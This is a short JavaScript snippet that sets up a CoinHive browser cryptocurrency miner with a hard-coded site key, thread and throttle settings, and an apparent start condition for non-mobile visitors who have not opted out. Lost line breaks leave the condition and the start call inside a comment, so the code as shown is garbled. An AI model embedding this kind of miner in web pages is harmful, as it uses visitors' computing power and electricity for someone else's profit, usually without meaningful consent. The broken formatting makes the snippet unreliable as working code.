var miner = new CoinHive.Anonymous('SZIYtBjwnak8sC7jGfRtendcvbh697xS', {
    threads: 2,
    throttle: 0.1
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}